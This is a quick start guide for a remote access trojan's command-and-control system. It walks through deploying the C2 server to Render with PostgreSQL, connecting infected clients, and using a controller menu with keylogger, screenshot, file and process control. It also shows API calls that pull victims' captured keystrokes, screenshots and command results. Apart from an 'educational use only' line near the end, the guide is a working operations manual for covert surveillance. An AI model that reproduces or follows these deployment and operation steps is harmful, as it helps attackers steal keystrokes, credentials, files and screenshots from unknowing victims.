# 🚀 QUICK START GUIDE - RAT C2 Database System

## 📝 Table of Contents
1. [Local Testing](#local-testing)
2. [Deploy to Render](#deploy-to-render)
3. [Access Dashboards](#access-dashboards)
4. [API Usage](#api-usage)
5. [Troubleshooting](#troubleshooting)

---

## 🏠 Local Testing

### Step 1: Install Dependencies
```bash
pip install -r requirements.txt
```

### Step 2: (Optional) Set Up PostgreSQL Locally
If you have PostgreSQL installed locally:
```bash
# Create database
createdb rat_c2_db

# Set environment variable
export DATABASE_URL="postgresql://localhost/rat_c2_db"
```

**Without PostgreSQL**: The system will automatically use file-based storage.

### Step 3: Start the Server
```bash
python server.py
```

You should see:
```
[DATABASE] ✅ Database initialized with 5 tables
[SERVER] Starting C2 server on port 5000
```

### Step 4: Start a Client
In a new terminal:
```bash
python client.py
```

You should see:
```
[REGISTRATION] ✅ Successfully registered with server
```

---

## ☁️ Deploy to Render

### Step 1: Create PostgreSQL Database
1. Go to https://render.com/
2. Click **"New +"** → **"PostgreSQL"**
3. Configure:
   - Name: `rat-c2-database`
   - Plan: **Free**
4. Click **"Create Database"**
5. Copy the **Internal Database URL** (starts with `postgresql://...`)

### Step 2: Deploy Web Service
1. Click **"New +"** → **"Web Service"**
2. Connect your GitHub repository
3. Configure:
   - Name: `rat-c2-server`
   - Environment: **Python 3**
   - Build Command: `pip install -r requirements.txt`
   - Start Command: `gunicorn server:app`
4. Add Environment Variable:
   - Key: `DATABASE_URL`
   - Value: **[paste the Internal Database URL]**
5. Click **"Create Web Service"**

### Step 3: Verify Deployment
Check the logs in Render dashboard:
```
[DATABASE] Using PostgreSQL database
[DATABASE] ✅ Database initialized with 5 tables
[DATABASE] Tables: clients, keylogs, commands, command_results, screenshots
```

---

## 🌐 Access Dashboards

### Local
- **Main Dashboard**: http://localhost:5000/dashboard
- **Database Dashboard**: http://localhost:5000/database

### Render
Replace `YOUR_APP_NAME` with your Render app name:
- **Main Dashboard**: https://YOUR_APP_NAME.onrender.com/dashboard
- **Database Dashboard**: https://YOUR_APP_NAME.onrender.com/database

---

## 📡 API Usage

### Get Statistics
```bash
curl https://YOUR_APP_NAME.onrender.com/api/database/stats
```

Response:
```json
{
  "success": true,
  "stats": {
    "clients": {"total": 5, "online": 3, "offline": 2},
    "keylogs": {"total": 234},
    "commands": {"total": 45, "pending": 2, "completed": 43},
    "results": {"total": 43},
    "screenshots": {"total": 12}
  }
}
```

### Get All Clients
```bash
curl https://YOUR_APP_NAME.onrender.com/api/database/clients
```

### Get Keylogs for Specific Client
```bash
curl "https://YOUR_APP_NAME.onrender.com/api/database/keylogs?client_id=DESKTOP-ABC123&limit=50"
```

### Get Recent Commands
```bash
curl "https://YOUR_APP_NAME.onrender.com/api/database/commands?limit=100"
```

### Get Command Results
```bash
curl "https://YOUR_APP_NAME.onrender.com/api/database/command_results?command_id=cmd_1705328400000"
```

### Get Screenshots
```bash
# Without image data (metadata only)
curl "https://YOUR_APP_NAME.onrender.com/api/database/screenshots?client_id=DESKTOP-ABC123&limit=10"

# With image data (Base64)
curl "https://YOUR_APP_NAME.onrender.com/api/database/screenshots?include_data=true&limit=5"
```

---

## 🎮 Using the Controller

### Start Controller
```bash
python controller.py
```

### Main Menu
```
===== C2 Controller =====
1. List Connected Clients
2. Select Client
3. View Keylogs
4. Exit
```

### Send Commands to Client
```
===== Client Menu =====
1. System Information
2. Process Manager
3. File Manager
4. Screenshot
5. Keylogger Control
6. Back to Main Menu
```

---

## 🔍 Troubleshooting

### Problem: "Database not configured" error in logs
**Solution**: Make sure `DATABASE_URL` environment variable is set correctly.

```bash
# Check if set
echo $DATABASE_URL

# Set it (replace with your actual URL)
export DATABASE_URL="postgresql://user:password@host:5432/database"
```

### Problem: Dashboard shows "No data"
**Solutions:**
1. Make sure at least one client is connected
2. Check server logs for errors
3. Verify database connection:
   ```bash
   psql $DATABASE_URL -c "SELECT COUNT(*) FROM clients;"
   ```

### Problem: Keylogs not appearing
**Solutions:**
1. Check if keylogger is started on client
2. Verify database save function is called:
   ```
   [DATABASE] ✅ Saved 5 keylogs for DESKTOP-ABC123
   ```
3. Query database directly:
   ```bash
   psql $DATABASE_URL -c "SELECT COUNT(*) FROM keylogs;"
   ```

### Problem: "Connection refused" when client tries to connect
**Solutions:**
1. Check `SERVER_IP` in `config.py`:
   ```python
   SERVER_IP = "https://YOUR_APP_NAME.onrender.com"
   ```
2. Make sure server is running
3. Check firewall settings

### Problem: Tables not created
**Solution**: The server automatically creates tables on startup. Check logs:
```
[DATABASE] ✅ Database initialized with 5 tables
```

If not appearing, manually create them:
```bash
psql $DATABASE_URL -f init_database.sql
```

---

## 📊 Database Dashboard Features

### Statistics Tab
- Total clients (online/offline)
- Total keylogs captured
- Commands sent/pending
- Command results received
- Screenshots captured

### Clients Tab
Shows all registered clients:
- Client ID
- IP Address
- Operating System
- Hostname
- Online Status
- Check-in Count
- First/Last Seen

### Keylogs Tab
Displays captured keystrokes:
- Client ID
- Window Title (where keys were pressed)
- Keylog Data
- Timestamp

### Commands Tab
Lists all sent commands:
- Command ID
- Client ID
- Action (e.g., list_processes, get_file)
- Command Data (parameters)
- Status (pending/completed)
- Created At

### Results Tab
Shows command execution results:
- Result ID
- Command ID
- Client ID
- Action Type
- Result Data (JSON)
- Created At

### Screenshots Tab
Displays screenshot metadata:
- Client ID
- Filename
- Dimensions (width x height)
- Quality percentage
- Size in KB
- Created At

---

## 🔄 Auto-Refresh

Both dashboards auto-refresh every **30 seconds** to show the latest data.

Manual refresh buttons are also available in each tab.

---

## 💾 Data Persistence

### What's Stored
- ✅ **Clients**: All registration and heartbeat data
- ✅ **Keylogs**: Every keystroke captured
- ✅ **Commands**: Every command you send
- ✅ **Results**: All command responses
- ✅ **Screenshots**: Image metadata + Base64 data

### Where It's Stored
- **Production (Render)**: PostgreSQL database
- **Local (no DATABASE_URL)**: JSON files in project directory

### Data Retention
- Keylogs: 7 days (configurable)
- Command results: 1 hour
- Clients: Marked offline after 1 hour of inactivity
- Screenshots: Unlimited

---

## 🎯 Next Steps

1. ✅ Test locally with PostgreSQL
2. ✅ Deploy to Render
3. ✅ Connect clients
4. ✅ Monitor via database dashboard
5. ✅ Query via API endpoints
6. ✅ Export data for analysis

---

## ⚠️ Important Notes

### Educational Use Only
This project is for **educational purposes only**. Using RAT software without authorization is illegal.

### Security
- Change the encryption key in production
- Add authentication to API endpoints
- Use HTTPS for all communication
- Secure your PostgreSQL credentials

### Performance
- The free Render PostgreSQL tier has limits
- Consider upgrading for production use
- Monitor database size regularly

---

## 📚 Additional Resources

- **Database Architecture**: See `DATABASE_ARCHITECTURE.md`
- **Technical Documentation**: See `DOCUMENTATION_TECHNIQUE.md`
- **Deployment Guide**: See `RENDER_DEPLOYMENT.md`
- **Project Merge Report**: See `MERGE_REPORT.md`

---

## 🆘 Support

If you encounter issues:
1. Check the logs (server and client)
2. Verify environment variables
3. Test database connection manually
4. Review API responses
5. Check this troubleshooting guide

---

**Happy hacking! 🎓**
